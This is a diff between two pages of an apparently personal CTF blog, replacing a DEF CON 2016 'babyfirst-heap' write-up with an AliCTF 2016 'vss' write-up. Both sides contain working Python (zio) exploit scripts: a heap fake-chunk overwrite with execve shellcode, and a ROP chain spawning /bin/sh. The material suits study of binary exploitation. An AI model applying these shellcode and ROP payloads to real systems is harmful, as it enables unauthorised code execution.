@@ -84,19 +84,22 @@
 
 
 
-<meta name="description" content="练习用
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_w">
+<meta name="description" content="alictf-qual-2016-vssConclusion之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是open-read-write的方式，后来比赛结束后看了网上发的writeup，才知道直接ROP系统调用即可，隔了几个月，重新自己做了下，本地测试，练习用
+Trick
+execve(&amp;#39;/bin/sh\x00&amp;#39;, 0, 0)，设置好rax=0x3b;rdi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="def-con-qual-2016-babyfirst">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/21/def-con-qual-2016-babyfirst/index.html">
+<meta property="og:title" content="alictf-qual-2016">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/31/alictf-qual-2016/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="练习用
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_w">
-<meta property="og:updated_time" content="2016-07-27T11:25:51.000Z">
+<meta property="og:description" content="alictf-qual-2016-vssConclusion之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是open-read-write的方式，后来比赛结束后看了网上发的writeup，才知道直接ROP系统调用即可，隔了几个月，重新自己做了下，本地测试，练习用
+Trick
+execve(&amp;#39;/bin/sh\x00&amp;#39;, 0, 0)，设置好rax=0x3b;rdi">
+<meta property="og:updated_time" content="2016-07-31T04:35:32.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="def-con-qual-2016-babyfirst">
-<meta name="twitter:description" content="练习用
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c&apos;io      = zio(target, print_read = c_read, print_w">
+<meta name="twitter:title" content="alictf-qual-2016">
+<meta name="twitter:description" content="alictf-qual-2016-vssConclusion之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是open-read-write的方式，后来比赛结束后看了网上发的writeup，才知道直接ROP系统调用即可，隔了几个月，重新自己做了下，本地测试，练习用
+Trick
+execve(&amp;#39;/bin/sh\x00&amp;#39;, 0, 0)，设置好rax=0x3b;rdi">
 
 
 
@@ -117,9 +120,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/21/def-con-qual-2016-babyfirst/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/07/31/alictf-qual-2016/"/>
 
-  <title> def-con-qual-2016-babyfirst | Icemakr's Blog </title>
+  <title> alictf-qual-2016 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -279,7 +282,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
             
               
-                def-con-qual-2016-babyfirst
+                alictf-qual-2016
               
             
           </h1>
@@ -291,8 +294,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-07-31T00:00:00+08:00" content="2016-07-31">
+              2016-07-31
             </time>
           </span>
 
@@ -321,8 +324,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/def-con-qual-2016-babyfirst/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/def-con-qual-2016-babyfirst/" itemprop="commentsCount"></span>
+                <a href="/2016/07/31/alictf-qual-2016/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/31/alictf-qual-2016/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -345,8 +348,14 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
       
 
       
-        <p>练习用</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+        <h1 id="alictf-qual-2016-vss">alictf-qual-2016-vss</h1><h2 id="Conclusion">Conclusion</h2><p>之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是<code>open-read-write</code>的方式，后来比赛结束后看了网上发的writeup，才知道直接<code>ROP</code>系统调用即可，隔了几个月，重新自己做了下，本地测试，练习用</p>
+<h2 id="Trick">Trick</h2><ul>
+<li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>，设置好<code>rax=0x3b;rdi=&#39;/bin/sh\x00&#39;;rsi=0;rdx=0</code></li>
+<li>程序是静态链接，想要的gadgets基本上都能找到</li>
+<li>利用<code>add rsp, 0x58</code>来抬升栈</li>
+</ul>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./vss_72e30bb98bdfbf22307133c16f8c9966'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x4011b0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">add_rsp = <span class="number">0x0046f205</span>    <span class="comment"># add rsp, 0x58 ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x00401937</span>    <span class="comment"># pop rsi       ; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x0043ae05</span>    <span class="comment"># pop rdx       ; ret</span></span><br><span class="line">pop_r12 = <span class="number">0x004004c3</span>    <span class="comment"># pop r12       ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x0046f208</span>    <span class="comment"># pop rax       ; ret</span></span><br><span class="line">mov_rdi = <span class="number">0x00495968</span>    <span class="comment"># mov rdi, rsp  ; call r12</span></span><br><span class="line">syscall = <span class="number">0x004004b8</span>    <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'py'</span> + <span class="string">'A'</span> * <span class="number">70</span></span><br><span class="line">payload +=  l64(add_rsp)</span><br><span class="line">payload =   payload.ljust(<span class="number">0x58</span>, <span class="string">'A'</span>)</span><br><span class="line">payload +=  l64(pop_rsi)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_rdx)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_r12)</span><br><span class="line">payload +=  l64(syscall)</span><br><span class="line">payload +=  l64(pop_rax)</span><br><span class="line">payload +=  l64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=  l64(mov_rdi)</span><br><span class="line">payload +=  <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Password:'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 
       
     </div>
@@ -372,17 +381,13 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/20/pwnable-toddler-s-bottle/" rel="next" title="Pwnable.kr [Toddler-s-Bottle] writeups">
-                <i class="fa fa-chevron-left"></i> Pwnable.kr [Toddler-s-Bottle] writeups
+              <a href="/2016/07/24/pwnable-rookiss/" rel="next" title="Pwnable.kr [Rookiss] writeups">
+                <i class="fa fa-chevron-left"></i> Pwnable.kr [Rookiss] writeups
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/21/qiangwang-qual-2015-shellman/" rel="prev" title="qiangwang-qual-2015-shellman">
-                qiangwang-qual-2015-shellman <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -507,7 +512,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#alictf-qual-2016-vss"><span class="nav-number">1.</span> <span class="nav-text">alictf-qual-2016-vss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
@@ -634,9 +639,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/21/def-con-qual-2016-babyfirst/';
-      var disqus_title = "def-con-qual-2016-babyfirst";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/21/def-con-qual-2016-babyfirst/';
+      var disqus_identifier = '2016/07/31/alictf-qual-2016/';
+      var disqus_title = "alictf-qual-2016";
+      var disqus_url = 'http://0byjwzsf.me/2016/07/31/alictf-qual-2016/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
